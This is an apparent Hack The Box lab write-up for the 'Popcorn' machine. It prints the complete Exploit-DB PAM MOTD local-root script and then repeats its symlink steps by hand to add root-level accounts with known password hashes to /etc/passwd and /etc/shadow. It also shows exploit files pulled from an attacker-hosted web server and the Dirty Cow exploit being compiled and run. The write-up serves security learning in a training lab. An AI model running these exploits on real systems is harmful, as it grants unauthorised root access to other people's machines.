Before attempting to exploit the vulnerability, we should first gain a basic understanding of how it works. We already know the target is running Ubuntu 9.10, and our research reveals an interesting behaviour within the Message of the Day (MOTD) system. When a user logs in, the `pam_motd` module executes a series of helper scripts to generate the dynamic MOTD. As part of this process, it also creates a backup of the user's `.bash_history` file.

The vulnerability lies in how this backup operation is performed. The relevant code executes with root privileges but follows symbolic links without validating their destination. As a result, an attacker can replace the `.bash_history` file with a symbolic link pointing to an arbitrary file, such as `/etc/passwd` or `/etc/shadow`. The next time `pam_motd` processes a login, it follows the symbolic link and writes to the target file with root privileges, allowing an attacker to modify files they would not normally have permission to access.

> **Info — Interesting Fact - Symbolic Links  **
> A symbolic link (or _symlink_) is a special type of file that acts as a pointer to another file or directory. Unlike a normal copy, a symlink does not contain the target's data; instead, it redirects any application that accesses it to the linked location.
> 
> If a privileged process follows a symbolic link without validating where it points, it can unintentionally read from or write to files that an unprivileged user would not normally have permission to access. This type of issue is commonly referred to as a **symlink attack** or **symbolic link following vulnerability**.

**Exploit-DB Script**

Given that we already have a script available, we can use it as a learning resource to better understand what is happening in the background. We begin by downloading the script to our Kali machine and hosting it with a Python3 web server. From there, we can transfer the script to the target machine and execute it. By comparing the script's code with its behaviour during execution, we can work towards manually reproducing the attack ourselves.

For clarity and ease of use, we rename the script to `motd.sh`. We can then review its contents, as this will be directly relevant for understanding the exploit and recreating the process manually later. After reviewing the script, we host it using a Python3 simple web server.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Popcorn/Exploit]
└─$ mv 14339.sh motd.sh

$ cat motd.sh   
#!/bin/bash
P='toor:x:0:0:root:/root:/bin/bash'
S='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'
echo "[*] Ubuntu PAM MOTD local root"
[ -z "$(which ssh)" ] && echo "[-] ssh is a requirement" && exit 1
[ -z "$(which ssh-keygen)" ] && echo "[-] ssh-keygen is a requirement" && exit 1
[ -z "$(ps -u root |grep sshd)" ] && echo "[-] a running sshd is a requirement" && exit 1
backup() {
    [ -e "$1" ] && [ -e "$1".bak ] && rm -rf "$1".bak
    [ -e "$1" ] || return 0
    mv "$1"{,.bak} || return 1
    echo "[*] Backuped $1"
}
restore() {
    [ -e "$1" ] && rm -rf "$1"
    [ -e "$1".bak ] || return 0
    mv "$1"{.bak,} || return 1
    echo "[*] Restored $1"
}
key_create() {
    backup ~/.ssh/authorized_keys
    ssh-keygen -q -t rsa -N '' -C 'pam' -f "$KEY" || return 1
    [ ! -d ~/.ssh ] && { mkdir ~/.ssh || return 1; }
    mv "$KEY.pub" ~/.ssh/authorized_keys || return 1
    echo "[*] SSH key set up"
}
key_remove() {
    rm -f "$KEY"
    restore ~/.ssh/authorized_keys
    echo "[*] SSH key removed"
}
own() {
    [ -e ~/.cache ] && rm -rf ~/.cache
    ln -s "$1" ~/.cache || return 1
    echo "[*] spawn ssh"
    ssh -o 'NoHostAuthenticationForLocalhost yes' -i "$KEY" localhost true
    [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; bye; }
    echo "[+] owned: $1"
}
bye() {
    key_remove
    exit 1
}
KEY="$(mktemp -u)"
key_create || { echo "[-] Failed to setup SSH key"; exit 1; }
backup ~/.cache || { echo "[-] Failed to backup ~/.cache"; bye; }
own /etc/passwd && echo "$P" >> /etc/passwd
own /etc/shadow && echo "$S" >> /etc/shadow
restore ~/.cache || { echo "[-] Failed to restore ~/.cache"; bye; }
key_remove
echo "[+] Success! Use password toor to get root"
su -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
  chgrp shadow /etc/shadow; nscd -i passwd >/dev/null 2>&1; bash" toor  

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Popcorn/Exploit]
└─$ python3 -m http.server 80                                      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Back in our shell on the Popcorn machine, we can now transfer the script using `wget` again. The successful download confirms that the exploit script has been retrieved and is now available on the target machine for further analysis and use.
```Shell
www-data@popcorn:/dev/shm$ wget http://10.10.14.62/motd.sh
wget http://10.10.14.62/motd.sh
--2026-08-04 22:54:58--  http://10.10.14.62/motd.sh
Connecting to 10.10.14.62:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3125 (3.1K) [application/x-sh]
Saving to: `motd.sh'

100%[======================================>] 3,125       --.-K/s   in 0s      

2026-08-04 22:54:58 (271 MB/s) - `motd.sh' saved [3125/3125]
```

Running the exploit successfully grants us root access using the password `toor`. We can observe the steps performed by the script during execution, giving us insight into the underlying exploitation process. With this information, we can now attempt to manually recreate the attack and gain a better understanding of how the vulnerability is exploited.
```Shell
www-data@popcorn:/dev/shm$ bash motd.sh
bash motd.sh
[*] Ubuntu PAM MOTD local root
[*] Backuped /var/www/.ssh/authorized_keys
[*] SSH key set up
[*] Backuped /var/www/.cache
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] Restored /var/www/.cache
[*] Restored /var/www/.ssh/authorized_keys
[*] SSH key removed
[+] Success! Use password toor to get root
Password: toor

root@popcorn:/dev/shm# id
id
uid=0(root) gid=0(root) groups=0(root)
```


**Manual Execution**

In theory, all we need to do now is follow the steps that the script automates on our behalf. As we recreate each stage manually, we can examine what is happening at every step and build a complete understanding of how the exploit works.

This approach provides a much stronger understanding than blindly executing scripts without knowing what is happening in the background. After all, the purpose of these walkthroughs is to develop a deeper understanding of the techniques being used.

The exploit requires an SSH login to trigger PAM MOTD. To achieve this, we first generate an SSH key and then authorise it for the `www-data` user. We do this because the vulnerability can be triggered from any account we control, provided we are able to establish SSH sessions as that user.
```Shell
www-data@popcorn:/var/www$ ssh-keygen -q -t rsa -N '' -f /tmp/pam_key
ssh-keygen -q -t rsa -N '' -f /tmp/pam_key                                                                                                                                                   
www-data@popcorn:/var/www$ mkdir -p ~/.ssh
mkdir -p ~/.ssh

www-data@popcorn:/var/www$ cp /tmp/pam_key.pub ~/.ssh/authorized_keys
cp /tmp/pam_key.pub ~/.ssh/authorized_keys
```

As we have write access to the `www-data` user's home directory, we can create a symbolic link that points `.cache` to `/etc/passwd`. However, creating the symlink alone is not enough to trigger the vulnerability. The vulnerable behaviour occurs when the `pam_motd` module is executed during the login process, meaning we need to create an SSH session to activate the vulnerable code path.

We then create a throwaway SSH session to trigger PAM MOTD. This session simply connects to localhost, executes the `true` command (which performs no action), and closes almost immediately.
```Shell
www-data@popcorn:/var/www$ rm -rf ~/.cache
rm -rf ~/.cache

www-data@popcorn:/var/www$ ln -s /etc/passwd ~/.cache
ln -s /etc/passwd ~/.cache

www-data@popcorn:/var/www$ ssh -o 'NoHostAuthenticationForLocalhost yes' -i /tmp/pam_key localhost true
<ssh -o 'NoHostAuthenticationForLocalhost yes' -i /tmp/pam_key localhost true
```

When PAM runs during the login process, it follows the symbolic link and writes to `/etc/passwd` with root privileges. We can then append our new `hackopotamus` user entry to the file.

The `x` in the password field tells Linux that the actual password hash is stored in `/etc/shadow`, while the `0:0` values assign the user the root user's UID and GID, effectively granting the account root-level privileges.
```Shell
www-data@popcorn:/var/www$ echo 'hackopotamus:x:0:0:root:/root:/bin/bash' >> /etc/passwd
<echo 'hackopotamus:x:0:0:root:/root:/bin/bash' >> /etc/passwd 
```

We then remove the existing symbolic link and recreate it, this time pointing towards `/etc/shadow`. After updating the link, we need to trigger another SSH session as before, causing PAM MOTD to follow the symbolic link and write to the target file with root privileges.
```Shell
www-data@popcorn:/var/www$ rm -rf ~/.cache
rm -rf ~/.cache

www-data@popcorn:/var/www$ ln -s /etc/shadow ~/.cache
ln -s /etc/shadow ~/.cache

www-data@popcorn:/var/www$ ssh -o 'NoHostAuthenticationForLocalhost yes' -i /tmp/pam_key localhost true
<ssh -o 'NoHostAuthenticationForLocalhost yes' -i /tmp/pam_key localhost true
```

We can now append the shadow entry. To do this, we follow the same format used by the exploit script, allowing us to set a known password of `toor` for our newly created `hackopotamus` user.
```Shell
www-data@popcorn:/var/www$ echo 'hackopotamus:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::' >> /etc/shadow
<lbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::' >> /etc/shadow
```

Removing the symbolic link and SSH key allows us to clean up the changes made during the exploitation process before switching users.
```Shell
www-data@popcorn:/var/www$ rm -rf ~/.cache
rm -rf ~/.cache

www-data@popcorn:/var/www$ rm -f /tmp/pam_key /tmp/pam_key.pub
rm -f /tmp/pam_key /tmp/pam_key.pub
```

We can now switch users using the `su` command. When prompted, we enter `toor` as the password and successfully authenticate as the `hackopotamus` account, which has root-level privileges due to its UID and GID configuration.
```Shell
www-data@popcorn:/var/www$ su hackopotamus
su hackopotamus
Password: toor

root@popcorn:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```


---

### Obtaining the Root Flags

As mentioned previously, we should now recover the root flag. The Dirty Cow kernel exploit can be unstable and has the potential to crash the system, so obtaining the flag at this stage reduces the risk of losing our progress if the machine becomes unavailable.

We navigate to the `/root` directory and locate the `root.txt` flag. Using the `cat` command, we can read its contents and confirm that we have successfully compromised the machine.
```bash
root@popcorn:/var/www# cd /root
cd /root
root@popcorn:~# ls
ls
root.txt
root@popcorn:~# cat root.txt
cat root.txt
[root flag redacted]
```


---

### Privilege Escalation — Dirty Cow (CVE-2016-5195)

The machine is also vulnerable to the Dirty Cow kernel exploit. However, using a kernel exploit immediately after gaining access is not always advisable, as these exploits can be unstable and have the potential to crash the target system. Since we have already obtained root access and recovered the flag, we can now safely experiment with this technique without risking our progression.

This also serves as a replacement for our usual **Beyond Root** section, as we have already fully compromised the machine and can now explore an additional exploitation path.

The Dirty Cow exploit source code is available [here](https://github.com/FireFart/dirtycow/blob/master/dirty.c). We can download it to our working directory using `wget` and then prepare to transfer it to the Popcorn machine using the Python3 web server, as we have done previously.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Popcorn/Exploit]
└─$ wget https://github.com/FireFart/dirtycow/blob/master/dirty.c
--2026-08-04 18:16:48--  https://github.com/FireFart/dirtycow/blob/master/dirty.c
Resolving github.com (github.com)... 20.26.156.215
Connecting to github.com (github.com)|20.26.156.215|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘dirty.c’

dirty.c                       [ <==>               ] 284.88K  --.-KB/s    in 0.04s 

2026-08-04 18:16:48 (7.01 MB/s) - ‘dirty.c’ saved [291718]

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Popcorn/Exploit]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We can now transfer the file to the Popcorn machine using `wget` again. From our earlier LinPeas enumeration, we already know that `gcc` is available on the system, allowing us to compile the source code into a working ELF binary.

Before executing the exploit, we first need to make the file executable. Without the correct permissions, the binary will not be able to run.
```Shell
www-data@popcorn:/dev/shm$ wget http://10.10.14.62/dirty.c
wget http://10.10.14.62/dirty.c
--2026-08-05 01:30:25--  http://10.10.14.62/dirty.c
Connecting to 10.10.14.62:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 291718 (285K) [text/x-csrc]
Saving to: `dirty.c'

100%[======================================>] 291,718     1.60M/s   in 0.2s    

2026-08-05 01:30:25 (1.60 MB/s) - `dirty.c' saved [291718/291718]

www-data@popcorn:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt

www-data@popcorn:/dev/shm$ chmod +x dirty
chmod +x dirty
```


Running the exploit with the `./dirty` command executes the Dirty Cow vulnerability. The exploit begins by creating a backup of `/etc/passwd` before prompting us to provide a new password. As with the previous section, we can use `toor` as the password.

The exploit then generates the new user entry and attempts to modify `/etc/passwd` using the vulnerability. The process takes some time to complete before returning control of the terminal, so we patiently wait for execution to finish.

Once complete, the exploit confirms that the new user has been created and provides the credentials required to authenticate. We can now use this newly created account to test whether the exploit was successful.
```Shell
www-data@popcorn:/dev/shm$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: toor

Complete line:
toor:to5bce5sr7eK6:0:0:pwned:/root:/bin/bash

mmap: b7865000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'toor' and the password 'toor'.


DON'T FORGET TO RESTORE!
```

We can now use the `su` command to switch users by supplying the username `toor` and entering the password `toor` when prompted. Once authenticated, we are running as the newly created account, which has root privileges assigned through its UID configuration. We have successfully completed the Dirty Cow exploitation path and compromised the machine.
```Shell
www-data@popcorn:/dev/shm$ su toor
su toor
Password: toor

toor@popcorn:/dev/shm# id
id
uid=0(toor) gid=0(root) groups=0(root)

```

---

## Closing Thoughts

This walkthrough represents a slightly different approach from my previous attempts. Earlier versions focused heavily on maintaining a professional tone throughout, which helped keep everything structured and technically focused, but I found that this could sometimes make the walkthroughs feel a little less engaging.

For this version, I have tried to find a better balance between technical accuracy and readability. The goal is still to explain the vulnerabilities, tools, and methodology properly, but in a way that feels more like following the thought process behind the attack rather than reading a technical report.

The purpose of my documenting process has never been to simply provide a list of commands to copy and paste. The important part to me is understanding why something works, what is happening in the background, and how we can apply that knowledge to future challenges.

Throughout this machine, we have taken the time to break down vulnerabilities rather than treating exploits as black boxes. From manually recreating the PAM MOTD exploitation process to exploring Dirty Cow and understanding how a kernel vulnerability can be abused, the focus has always been on learning the technique rather than just reaching the final flag.

Hopefully, this style makes the walkthroughs more approachable while still keeping the technical depth required to demonstrate personally developed skills. The aim is simple: learn how things work, understand why they work, and build the ability to adapt those techniques when facing new challenges.
